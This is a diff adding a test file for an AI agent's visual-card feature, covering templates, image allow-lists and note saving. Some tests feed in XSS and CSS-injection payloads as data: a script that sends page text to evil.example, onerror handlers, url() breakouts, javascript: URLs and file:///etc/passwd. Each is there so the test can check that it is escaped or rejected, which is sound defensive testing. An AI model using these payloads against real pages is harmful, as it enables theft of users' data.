@@ -1,0 +1,240 @@
+/**
+ * VISUAL ANSWERS (owner, 2026-10-26: "less wordy more visuals"): `draw_visual`
+ * fills one of Tex's designed cards from data, the screenshot Worker
+ * photographs it, and the same card can be kept in the note Tex writes.
+ *
+ * ## Sabotage record
+ *
+ * Applied, suite run, named check observed failing, reverted.
+ *
+ *   `esc` returning its input → "the model's words are text on the card,
+ *     never markup" fails.
+ *   `photoUrl` taking any string → "a photo address cannot break out of its
+ *     url()" fails.
+ *   `allow` built from every address in the card → "a card's photo loads only
+ *     if the turn read its address" fails.
+ *   `made` returning any picture (`outgoingPictures.js`) → "only a picture
+ *     this turn drew or made is kept in a note by its number" fails.
+ *   route.js without `withDrawnImages` → "a texted turn draws a card, texts
+ *     one line, and keeps the card in the note" fails.
+ *   `VISUALS_LINE` left out of the texted prompt → "a texted turn is told when
+ *     to draw" fails.
+ */
+
+import assert from "node:assert/strict";
+import { test } from "node:test";
+
+import { outgoingPictures } from "../src/agent/outgoingPictures.js";
+import { DRAW_TOOL, MAKE_TOOL, pictureMaker, withDrawnImages, withPictureMaker } from "../src/agent/pictureMaker.js";
+import { VISUALS_LINE, VISUAL_TEMPLATES, VISUAL_TOOL, buildVisual } from "../src/agent/visuals/index.js";
+import { esc, photoUrl } from "../src/agent/visuals/kit.js";
+import { hours } from "../src/agent/visuals/time.js";
+import { OPEN_PAGE_TOOL, webSession } from "../src/agent/computer.js";
+
+/** One real 1x1 PNG: what the screenshot Worker hands back, small enough to read. */
+const CARD_PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR4nGNgAAIAAAUAAXpeqz8AAAAASUVORK5CYII=";
+
+function siteShots() {
+  const calls = [];
+  return {
+    calls,
+    SITE_SHOTS: {
+      async fetch(url, init) {
+        const body = JSON.parse(init.body);
+        calls.push({ url, body });
+        return new Response(JSON.stringify({ png: CARD_PNG, width: body.width, height: body.height, blocked: [] }), { status: 200 });
+      },
+    },
+  };
+}
+
+/** One filled example per template: what the approved artboard showed. */
+const EXAMPLES = {
+  compare: { kicker: "NYCG Generals · catering for 30", title: "All three fit the $300 budget", limit: 300, items: [{ name: "Blend LIC", value: 225, display: "$225" }, { name: "Lugo's", value: 230, display: "$230" }, { name: "India Passage", value: 290, display: "$290" }] },
+  gallery: { style: "editorial", title: "Three that fit the brief", items: [{ name: "Wrap midi", price: "$128", pick: true }, { name: "Slip dress", price: "$98" }] },
+  versus: { title: "B wins 4 of 6", items: [{ name: "Bed-Stuy" }, { name: "Crown Heights" }], rows: [{ label: "Rent", a: "$2,650", b: "$2,800", better: "a" }] },
+  places: { title: "3 within 10 minutes", items: [{ name: "Casa Enrique", distance: "4 min" }] },
+  tickets: { title: "The 6pm gets you home sooner", items: [{ name: "Delta 1421", depart: "6:00", arrive: "8:25", price: "$189", pick: true }] },
+  trip: { title: "Your weekend", days: [{ name: "Saturday", stops: [{ time: "9:40 AM", what: "Land YUL" }] }] },
+  day: { title: "Free 1–3", events: [{ start: "9:00", end: "10:00", title: "Standup" }, { start: "1 PM", end: "3 PM", title: "Free", kind: "free" }] },
+  plan: { title: "Venue is at risk", weeks: 6, today: 1.6, tasks: [{ name: "Book venue", start: 0.5, length: 2.5, state: "late" }] },
+  board: { title: "5 going, 1 needs you", columns: [{ name: "In progress", items: [{ name: "Visual answers", progress: 20, who: "Claude Code" }] }] },
+  chart: { title: "Halfway there", stats: [{ label: "Before", value: "2.4s" }, { label: "Now", value: "1.1s" }], bars: [{ name: "Cache the feed", value: 700, display: "−700ms", state: "done" }] },
+  spending: { total: "$3,420", items: [{ name: "Rent", amount: 1650, display: "$1,650" }, { name: "Food", amount: 620, display: "$620" }] },
+  steps: { title: "4 steps", steps: [{ title: "Shut the water off" }] },
+  people: { title: "You know 3 of 4", people: [{ name: "Dana Cole", role: "Venue manager", new: true }] },
+  system: { title: "How the pieces connect", layers: [{ parts: [{ name: "Kiosk iPad" }] }, { core: true, parts: [{ name: "Convex backend" }] }] },
+  streak: { count: 12, title: "days in a row", marks: "0111111111111" },
+};
+
+test("every template draws from its example, at 1200x1500, with its words on the card", () => {
+  assert.deepEqual(Object.keys(EXAMPLES).sort(), [...VISUAL_TEMPLATES].sort(), "an example for every template");
+  for (const template of VISUAL_TEMPLATES) {
+    const built = buildVisual({ template, data: EXAMPLES[template] });
+    assert.equal(built.error, undefined, template);
+    assert.equal(built.width, 1200);
+    assert.equal(built.height, 1500);
+    assert.ok(built.html.includes(esc(EXAMPLES[template].title ?? EXAMPLES[template].total)), `${template} shows its title`);
+    assert.doesNotMatch(built.html, /undefined|NaN|\[object Object\]/, `${template} has no holes`);
+  }
+});
+
+test("a template that is not one, or data that is not an object, is refused in words the model can act on", () => {
+  assert.match(buildVisual({ template: "poster", data: {} }).error, /Pick one of: compare, gallery/);
+  assert.match(buildVisual({ template: "compare", data: "Blend $225" }).error, /as data/);
+  assert.match(buildVisual({ template: "compare" }).error, /as data/);
+});
+
+test("the model's words are text on the card, never markup", () => {
+  const attack = '</div><script>fetch("https://evil.example/?"+document.body.innerText)</script><img src=x onerror=alert(1)>';
+  for (const template of VISUAL_TEMPLATES) {
+    const data = JSON.parse(JSON.stringify(EXAMPLES[template]));
+    data.title = attack;
+    data.kicker = attack;
+    const html = buildVisual({ template, data }).html;
+    assert.doesNotMatch(html, /<script|onerror=|<img/i, template);
+  }
+  // A colour or a size is never the model's: the theme is one of two words.
+  assert.doesNotMatch(buildVisual({ template: "compare", data: EXAMPLES.compare, theme: "red;background:url(https://evil.example)" }).html, /evil\.example/);
+});
+
+test("a photo address cannot break out of its url()", () => {
+  assert.equal(photoUrl("https://cdn.shop.example/dress.jpg"), "https://cdn.shop.example/dress.jpg");
+  assert.equal(photoUrl("picture:3"), "picture:3");
+  for (const bad of ["https://a.example/x.jpg');background:url('https://evil.example", "javascript:alert(1)", "http://a.example/x.jpg", "data:image/png;base64,AAAA", 'https://a.example/x".jpg', "picture:3 ", "file:///etc/passwd"]) {
+    assert.ok(photoUrl(bad) === null || photoUrl(bad) === "picture:3", bad);
+  }
+  const html = buildVisual({ template: "gallery", data: { title: "x", items: [{ name: "a", photo: "https://a.example/x.jpg');background:url('https://evil.example/" }] } }).html;
+  assert.doesNotMatch(html, /evil\.example/);
+  // The page decodes character references in a style attribute before CSS reads it, so &#39 would close the url('…').
+  for (const bad of ["https://a.example/x&#39;);color:red;x:url(&#39;y", "https://a.example/x&#39);z", "https://a.example/x&#x27;y", "https://a.example/x&apos;y"]) {
+    assert.equal(photoUrl(bad), null, bad);
+  }
+  assert.equal(photoUrl("https://a.example/x.jpg?w=600&h=400"), "https://a.example/x.jpg?w=600&h=400", "a query string still works");
+});
+
+test("times are read as people write them", () => {
+  assert.equal(hours("9:30"), 9.5);
+  assert.equal(hours("1 PM"), 13);
+  assert.equal(hours("12:15 am"), 0.25);
+  assert.equal(hours("15:00"), 15);
+  assert.equal(hours("13 PM"), null);
+  assert.equal(hours("noon"), null);
+});
+
+test("draw_visual is offered beside draw_picture, and only where the screenshot Worker is", () => {
+  const outgoing = outgoingPictures({ enabled: true });
+  assert.deepEqual(pictureMaker(siteShots(), { outgoing }).tools.map((t) => t.name), [VISUAL_TOOL, DRAW_TOOL]);
+  assert.deepEqual(pictureMaker({}, { gateway: { base: "https://g.example", token: "t" }, outgoing }).tools.map((t) => t.name), [MAKE_TOOL]);
+  const definition = pictureMaker(siteShots(), { outgoing }).tools[0];
+  for (const template of VISUAL_TEMPLATES) assert.ok(definition.description.includes(`- ${template}:`), template);
+});
+
+test("a card's photo loads only if the turn read its address; fonts are never counted as missing", async () => {
+  const shots = siteShots();
+  const read = "https://cdn.shop.example/wrap-midi.jpg";
+  const outgoing = outgoingPictures({ enabled: true, question: "black dress under 150" });
+  const maker = pictureMaker(shots, { outgoing });
+  // The page Tex opened listed its picture (`computer.js`), so the address was read this turn.
+  const call = outgoing.wrap(withPictureMaker(maker, async () => ({ content: [{ type: "text", text: `Pictures on the page:\n- Wrap midi - ${read}` }] })));
+  await call("open_page", { url: "https://shop.example/wrap-midi" });
+  const result = await call(VISUAL_TOOL, {
+    template: "gallery",
+    data: { title: "Three that fit", items: [{ name: "Wrap midi", photo: read }, { name: "Made up", photo: "https://evil.example/?q=their-address" }] },
+  });
+  const sent = shots.calls[0].body;
+  assert.deepEqual(sent.allow, [read]);
+  assert.equal(sent.width, 1200);
+  assert.equal(sent.height, 1500);
+  assert.match(sent.html, /fonts\.googleapis\.com/);
+  assert.equal(result.content[0].type, "image");
+  assert.match(result.content[1].text, /^Drawn at 1200x1500\. 1 address\(es\) did not load/, "the made-up address, never the fonts");
+  assert.match(result.content.at(-1).text, /This is picture 1/);
+});
+
+test("a photo they sent or a picture shown this turn goes into the card as data", async () => {
+  const shots = siteShots();
+  const outgoing = outgoingPictures({ enabled: true });
+  const maker = pictureMaker(shots, { outgoing, attachments: [{ name: "me.jpg", mediaType: "image/jpeg", data: "TUU=" }] });
+  await maker.call(VISUAL_TOOL, { template: "versus", data: { title: "x", items: [{ name: "A", photo: "attachment:1" }, { name: "B" }] } });
+  assert.match(shots.calls[0].body.html, /url\('data:image\/jpeg;base64,TUU='\)/);
+});
+
+test("only a picture this turn drew or made is kept in a note by its number", async () => {
+  const shots = siteShots();
+  const outgoing = outgoingPictures({ enabled: true });
+  const maker = pictureMaker(shots, { outgoing });
+  const written = [];
+  const dispatch = async (name, args) => {
+    if (name === "read_image") return { content: [{ type: "image", data: "Tk9URQ==", mimeType: "image/png" }] };
+    written.push({ name, args });
+    return { content: [{ type: "text", text: "saved" }] };
+  };
+  const call = outgoing.wrap(withPictureMaker(maker, withDrawnImages(outgoing, dispatch)));
+  await call("read_image", { path: "private/photo.png" }); // picture 1: read out of a note
+  await call(VISUAL_TOOL, { template: "compare", data: EXAMPLES.compare }); // picture 2: drawn
+
+  const refused = await call("write_note", { path: "team/catering.md", content: "![[a.png]]", images: [{ name: "a.png", data: "picture:1" }] });
+  assert.equal(refused.isError, true);
+  assert.match(refused.content[0].text, /only a picture you drew or made this turn/);
+  assert.equal(written.length, 0, "nothing was written");
+
+  await call("write_note", { path: "team/catering.md", content: "![[card.png]]", images: [{ name: "card.png", data: "picture:2", alt: "Catering" }] });
+  assert.deepEqual(written[0].args.images, [{ name: "card.png", data: `data:image/png;base64,${CARD_PNG}`, alt: "Catering" }]);
+  // Any other write passes through untouched.
+  await call("write_note", { path: "a.md", content: "hi" });
+  assert.deepEqual(written[1].args, { path: "a.md", content: "hi" });
+});
+
+test("a page Tex opens lists its pictures, so a visual answer can show the thing itself", async () => {
+  const session = webSession(
+    {
+      async readPage(url) {
+        return { url, title: "Wrap midi", text: "A black wrap dress.", links: [], images: [{ alt: "Front", src: "https://cdn.shop.example/front.jpg" }, { alt: "", src: "javascript:alert(1)" }] };
+      },
+    },
+    "find me a dress at https://shop.example/wrap-midi",
+  );
+  const result = await session.call(OPEN_PAGE_TOOL, { url: "https://shop.example/wrap-midi" });
+  const said = result.content[0].text;
+  assert.match(said, /Pictures on the page[^\n]*:\n- Front - https:\/\/cdn\.shop\.example\/front\.jpg/);
+  assert.doesNotMatch(said, /javascript:/);
+});
+
+test("the texted prompt says when to draw: two signals, one line, the card in the note", () => {
+  assert.match(VISUALS_LINE, /Two or more/);
+  assert.match(VISUALS_LINE, /25 words at most/);
+  assert.match(VISUALS_LINE, /save with write and args: \{ images: \[\{ name: 'card\.png', data: 'picture:N' \}\] \}/);
+  assert.match(VISUALS_LINE, /Never draw for a yes or no/);
+});
+
+test("a texted turn draws a card, texts one line, and keeps the card in the note", async () => {
+  const { createEgressWorld, request, TOKEN_TEXTS } = await import("./agentEgressFixtures.mjs");
+  const world = await createEgressWorld();
+  try {
+    const shots = siteShots();
+    const env = { ...world.env, SITE_SHOTS: shots.SITE_SHOTS };
+    world.model.install([
+      { toolCalls: [{ name: "send", args: { action: VISUAL_TOOL, args: { template: "compare", data: EXAMPLES.compare } } }] },
+      { toolCalls: [{ name: "write", args: { action: "save", path: "catering-options.md", content: "# Catering options\n\n![[card.png]]\n\nBlend LIC is cheapest at $225.", args: { images: [{ name: "card.png", data: "picture:1" }] } } }] },
+      { text: "All 3 fit the $300. Blend LIC is cheapest at $225. Want me to book it?\n\n[picture 1]" },
+    ]);
+    const asked = await request(env, TOKEN_TEXTS, "/agent", { question: "find catering for the Generals, 30 people, $10 a head", conversation: "texts" });
+    assert.equal(asked.status, 200, JSON.stringify(asked.body));
+    assert.equal(asked.body.answer, "All 3 fit the $300. Blend LIC is cheapest at $225. Want me to book it?");
+    assert.deepEqual(asked.body.pictures, [{ name: "picture-1.png", mediaType: "image/png", data: CARD_PNG }]);
+    assert.equal(shots.calls[0].body.width, 1200);
+    const prompt = JSON.stringify(world.model.requests[0]);
+    assert.ok(prompt.includes("VISUAL ANSWERS"), "a texted turn is told when to draw");
+    assert.ok(prompt.includes(VISUAL_TOOL), "and offered the tool");
+    const saved = JSON.stringify(world.model.requests[2].messages ?? world.model.requests[2]);
+    assert.doesNotMatch(saved, /only a picture you drew/, "the card was accepted for the note");
+    const bodies = [...world.bucket.keys()].map((key) => [key, String(world.bucket.get(key)?.body ?? "")]);
+    const note = bodies.find(([key, body]) => !key.startsWith("tex/") && body.startsWith("# Catering options"));
+    assert.ok(note, "the note was written");
+    assert.match(note[1], /!\[\[[^\]]+\.png\]\]/, "the note embeds the stored card");
+    assert.ok(bodies.some(([key]) => key.endsWith(".png")), "the card's bytes are stored beside it");
+  } finally {
+    world.restore();
+  }
+});
